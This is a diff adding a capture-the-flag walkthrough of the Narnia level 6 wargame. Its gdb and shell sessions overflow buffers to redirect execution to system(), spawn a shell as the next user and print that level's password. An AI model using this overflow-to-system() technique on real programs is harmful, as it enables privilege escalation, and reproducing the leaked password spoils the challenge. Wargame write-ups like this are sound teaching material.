@@ -21,7 +21,7 @@ narnia6@melinda:/narnia$ cat narnia6.c
     Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
 #include <stdio.h>
-#include <stdlib.h>
+#include <stdlib.h>  <---- Contains system() function
 #include <string.h>
 
 extern char **environ;
@@ -60,5 +60,49 @@ narnia6@melinda:/narnia$ ./narnia6
 ./narnia6 b1 b2
 narnia6@melinda:/narnia$ ./narnia6 a b
 a  
+narnia6@melinda:/narnia$ ./narnia6 $(python -c'print "A"*8 + " " + "B"*8')
+Segmentation fault  
+narnia6@melinda:/narnia$ gdb -q ./narnia6
+Reading symbols from ./narnia6...(no debugging symbols found)...done.
+Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 + " " + "B"*8')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048301 in ?? ()  
+(gdb) r $(python -c'print "A"*8 + "BBBB" +  " " + "C"*8')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 + "BBBB" +  " " + "C"*8')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()  
+(gdb) r $(python -c'print "A"*8 +  " " + "C"*8 + "AAAA"')  
+Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 +  " " + "C"*8 + "AAAA"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048301 in ?? ()  
+(gdb) r a b
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /games/narnia/narnia6 a b
+
+Breakpoint 1, 0x0804855d in main ()  
+(gdb) break system  <---- Put a breakpoint at the memory location of system()  
+Breakpoint 2 at 0xf7e62e70  
+Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 +  "\x70\x2e\xe6\xf7" +  " " + "C"*8')
+
+Breakpoint 1, 0x0804855d in main ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0xf7e62e70 in system () from /lib32/libc.so.6  
+(gdb) quit
+narnia6@melinda:/narnia$ ./narnia6 $(python -c'print "A"*8 +  "\x70\x2e\xe6\xf7" +  " " + "C"*8 + "/bin/sh"')
+$ whoami
+narnia7
+$ cat /etc/narnia_pass/narnia7
+ahkiaziphu  
+
+```
 
 
